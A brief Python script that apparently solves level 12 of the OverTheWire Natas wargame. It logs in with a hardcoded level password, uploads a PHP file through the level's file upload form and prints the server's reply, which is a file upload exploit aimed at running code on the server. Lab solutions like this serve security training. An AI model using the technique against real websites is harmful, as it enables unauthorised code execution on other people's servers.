#!/usr/bin/python3

import requests
import urllib

username = "natas12"
password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"

url = 'http://'+username+'.natas.labs.overthewire.org/upload/1dellrarg8.php'
session = requests.session()
response = session.post(url,files = {'uploadedfile' : open('Level12.php','rb')},data = {'filename' : 'Level12.php', 'MAX_FILE_SIZE' : '1000'} ,auth = (username, password))
content = response.text

print(content)
